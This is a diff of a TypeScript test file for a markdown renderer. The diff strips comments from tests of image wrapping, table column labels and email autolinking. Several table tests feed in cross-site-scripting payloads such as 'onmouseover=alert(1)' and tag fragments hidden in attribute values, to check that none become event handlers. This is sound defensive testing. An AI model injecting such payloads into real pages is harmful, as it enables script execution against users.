@@ -1501,9 +1353,6 @@ describe('renderMarkdown images', () => {
   });
 
   it('rewrites AND wraps an inline-variant image, like a reply image', () => {
-    // A question card showed an agent's mockups shrunk to the card's width,
-    // with no sideways scroll and no tap to open them. The wrapper is a
-    // `<span>`, so the output stays phrasing content a <button> may hold.
     const html = renderMarkdownInline('see ![alt](artifacts/x.png) here');
     expect(imgSrc(html)).toBe('/myws/data/artifacts/x.png');
     expect(html).toContain(
@@ -1538,13 +1387,6 @@ describe('renderMarkdown images', () => {
   });
 });
 
-/**
- * Tables. Two properties are pinned here; the third (that a column is never
- * laid out narrower than its longest word) is a LAYOUT property with no
- * observable in this suite, since vitest runs against the stub `document` in
- * test-setup.ts with no layout engine. It lives in
- * e2e/markdown-table-columns-all.spec.ts instead.
- */
 describe('renderMarkdown tables', () => {
   const mdRow = (cells: string[]) => `| ${cells.join(' | ')} |`;
   const mdTable = (headers: string[], ...rows: string[][]) =>
@@ -1598,19 +1440,10 @@ describe('renderMarkdown tables', () => {
   it('escapes a header so it cannot break out of the attribute', () => {
     const html = renderMarkdown(mdTable(['a"b', 'A & B', 'C', 'D'], ['w', 'x', 'y', 'z']));
     expect(html).toContain('data-label="a&quot;b"');
-    // Single-escaped: a double escape would render the literal text "&amp;".
     expect(html).toContain('data-label="A &amp; B"');
     expect(html).not.toContain('&amp;amp;');
   });
 
-  /** The label is stamped ONTO the cell, so whoever decides where the cell
-   *  starts and ends decides whether the label lands in attribute-name
-   *  position. The serializer leaves `<` and `>` raw inside an attribute value,
-   *  so a regex cannot make that call. Both shapes below turned a header cell
-   *  into an event handler on the host document.
-   *
-   *  Read off the PARSED result rather than the string, because the string is
-   *  exactly what looked fine. */
   const HEADER_PAYLOAD = 'X onmouseover=alert(1) Y';
   const handlerCarriers = (html: string) =>
     [...new DOMParser().parseFromString(html, 'text/html').querySelectorAll('*')]
@@ -1630,10 +1463,6 @@ describe('renderMarkdown tables', () => {
     expect(cell!.textContent).toBe('w');
   });
 
-  /** The second shape, which a quote-aware regex does not close either: the
-   *  three characters `<td` sitting inside another element's attribute value.
-   *  A `<th>` may share a row with a `<td>`, which is what gave the false start
-   *  a closing tag to pair with. */
   it('stamps no cell for a <td written inside an attribute value', () => {
     const html = renderMarkdown(
       `<table><tr><th><span title="<td a=1>">${HEADER_PAYLOAD}</span></th>`
@@ -1642,16 +1471,10 @@ describe('renderMarkdown tables', () => {
     );
     expect(handlerCarriers(html)).toEqual([]);
     const doc = new DOMParser().parseFromString(html, 'text/html');
-    // The text stays text, and the real cells are still labelled: the header
-    // row's lone `<td>` takes the first label, then the body row takes four.
     expect(doc.querySelector('span')!.getAttribute('title')).toBe('<td a=1>');
     expect(labels(html)).toEqual([HEADER_PAYLOAD, HEADER_PAYLOAD, 'B', 'C', 'D']);
   });
 
-  /** The serializer writes `<` and `>` raw inside a value, and `linkifyPaths`
-   *  re-scans this output. Its `splitTags` must keep a `>` in the label from
-   *  ending the tag, or a spliced link puts the rest in attribute-name
-   *  position. */
   it("a header's angle brackets stay in the label and never become a handler", () => {
     const html = renderMarkdown(
       mdTable(['q>https://e.com/onmouseover=x;//', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']),
@@ -1665,10 +1488,6 @@ describe('renderMarkdown tables', () => {
     expect(handlers).toEqual([]);
   });
 
-  /** A nested table is its own table. Counting its headers toward the outer
-   *  column count stacked a two-column grid. Stamping the outer labels onto
-   *  the inner cells labelled them with the wrong column. The CSS rule reaches
-   *  every descendant cell, so both showed on a phone. */
   it('counts and labels a nested table apart from the one holding it', () => {
     const html = renderMarkdown(
       '<table><tr><th>A</th><th>B</th></tr>'
@@ -1679,11 +1498,9 @@ describe('renderMarkdown tables', () => {
     );
     const doc = new DOMParser().parseFromString(html, 'text/html');
     const [outer, inner] = Array.from(doc.querySelectorAll('table'));
-    // Two columns, so the outer keeps the grid and stamps nothing.
     expect(outer.hasAttribute('data-stack')).toBe(false);
     expect(Array.from(outer.rows[1].cells, (c) => c.hasAttribute('data-label')))
       .toEqual([false, false]);
-    // Four, so the inner stacks and carries its OWN headers.
     expect(inner.hasAttribute('data-stack')).toBe(true);
     expect(Array.from(inner.rows[1].cells, (c) => c.getAttribute('data-label')))
       .toEqual(['N1', 'N2', 'N3', 'N4']);
@@ -1701,16 +1518,12 @@ describe('renderMarkdown tables', () => {
   });
 
   it('labels the padded cells of a short row, which stay empty for the CSS to hide', () => {
-    // marked pads a short row out to the header's column count.
     const md = ['| A | B | C | D |', '| --- | --- | --- | --- |', '| w | x |'].join('\n');
     const html = renderMarkdown(md);
     expect(labels(html)).toEqual(['A', 'B', 'C', 'D']);
     expect(html).toContain('<td data-label="C"></td>');
   });
 
-  // The post-sanitizer passes share one module-level inert body, so markup one
-  // render left in it would reach the next. `inDom` empties it in a `finally`;
-  // this is what notices if that stops happening.
   it('is stable across repeated renders of the same table', () => {
     const md = mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']);
     const first = renderMarkdown(md, { cache: false });
@@ -1719,9 +1532,6 @@ describe('renderMarkdown tables', () => {
     expect(labels(second)).toEqual(['A', 'B', 'C', 'D']);
   });
 
-  // The same body serves images and tables, so a render of one must not leave
-  // anything for the other. Interleaved deliberately: a leak shows up as the
-  // previous document's markup prefixed onto this one.
   it('leaves nothing behind for the next render', () => {
     const table = mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']);
     const image = '![a](artifacts/one.png)';
@@ -1742,9 +1552,6 @@ describe('renderMarkdown tables', () => {
   });
 });
 
-// marked's GFM autolinker reads any `local@domain.tld` run as an email, even
-// inside a path. A home directory like `/Users/me.x@example.com/` then renders
-// a `mailto:` link in the middle of the path, and a click opens Mail.
 describe('renderMarkdown email autolinks inside a path', () => {
   it('leaves an email-shaped path segment as plain text', () => {
     const html = renderMarkdown('DMG: file:///Users/me.x@example.com/p/Lucidos.dmg', { cache: false });
